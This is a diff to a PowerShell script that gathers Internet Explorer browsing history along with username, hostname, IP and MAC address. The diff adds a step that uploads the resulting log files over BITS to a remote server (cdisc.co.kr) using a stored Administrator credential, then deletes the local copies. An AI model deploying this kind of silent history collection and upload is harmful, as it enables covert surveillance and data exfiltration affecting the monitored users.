@@ -4,27 +4,22 @@ if(!(test-path 'C:\ProgramData\soalog'))
 
     $env:hostIP = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.netadapter.status -ne "Disconnected"}).ipv4address.ipaddress 
     $env:hostMAC = (Get-NetAdapter | where-object -FilterScript {$_.HardwareInterface -eq "True" -and $_.Status -ne "Disconnected"} | Where-Object {$_.InterfaceDescription -notmatch "TEST"}).MacAddress 
-    "DDDd"
     $shell = New-Object -ComObject Shell.Application       
     $history = $shell.NameSpace(34)  
     $folder = $history.Self       
-            "DDDd"
     $history.Items() |          
         foreach {            
          if ($_.IsFolder) {   
            $siteFolder = $_.GetFolder        
            $siteFolder.Items() |       
            foreach {          
-           "DDDd" 
              $site = $_           
              if ($site.IsFolder) {   
                 $pageFolder  = $site.GetFolder      
                 $pageFolder.Items() |         
                 foreach {           
-                      "DDDd"
                       if($($site.Name) -ne "내 PC")
                        {
-                       "DDDd"
                        $datetime = "$($pageFolder.GetDetailsOf($_,2))"   
                        $visit_time = Get-Date $datetime -Format yyyy-MM-ddTHH:mm:ss+09:00
                        $env:COMPUTERNAME + ":::;" + $env:username + ":::;"  + $env:hostIP + ':::;' + $env:hostMAC + ':::;'  +  $visit_time + ':::;' +
@@ -57,3 +52,26 @@ if(!(test-path 'C:\ProgramData\soalog'))
          }            
     }  
   
+   if($?)
+    {
+        Import-Module bitstransfer
+        $enc = Get-Content C:\Windows\enp.txt | ConvertTo-SecureString # specify the directory where the encrypted password file is located
+        $user = "Administrator" # server ID
+        $cred = New-Object System.Management.Automation.PSCredential($user,$enc)
+        $src = "C:\ProgramData\soalog\*_IEhistory.txt"
+        Get-ChildItem -path $src |
+        foreach {
+        $dst = "http://cdisc.co.kr:1024/soa/upload/$($_.name)" # server directory with write permissions
+        $job = Start-BitsTransfer -source $($_.FullName) -Destination $dst -Credential $cred -TransferType Upload -Asynchronous
+        while (($job.jobstate -eq "Transferring") -or ($job.jobstate -eq "Connecting")) `
+        {sleep 10;}
+        Switch($job.jobstate)
+        {
+        "Transferred" {Complete-BitsTransfer -BitsJob $job}
+        }
+        if($?)
+        {
+        Remove-Item $($_.FullName)
+        }
+        }
+    }
